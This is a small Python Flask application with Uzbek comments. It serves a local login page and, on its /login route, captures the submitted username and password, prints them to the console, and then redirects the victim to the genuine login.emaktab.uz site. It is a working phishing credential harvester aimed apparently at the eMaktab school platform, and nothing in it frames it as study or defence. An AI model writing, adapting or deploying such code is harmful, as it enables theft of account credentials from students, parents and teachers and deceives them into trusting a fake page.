import os
from flask import Flask, request, redirect

app = Flask(__name__)

# Fayl yo'lini aniqlash (Xatolikni oldini olish uchun)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route('/')
def index():
    file_path = os.path.join(BASE_DIR, 'index.html')
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    else:
        return f"Xatolik: {file_path} manzilida index.html topilmadi!"

@app.route('/login', methods=['POST'])
def login():
    # Terminalda ko'rish uchun ma'lumotlarni olish
    login_val = request.form.get('login')
    pass_val = request.form.get('password')

    # Terminalga chiqarish
    print("\n" + "!"*30)
    print(f"LOGIN: {login_val}")
    print(f"PAROL: {pass_val}")
    print("!"*30 + "\n")

    # Haqiqiy saytga yo'naltirish
    return redirect("https://login.emaktab.uz/")

if __name__ == "__main__":
    app.run(port=5000, debug=True)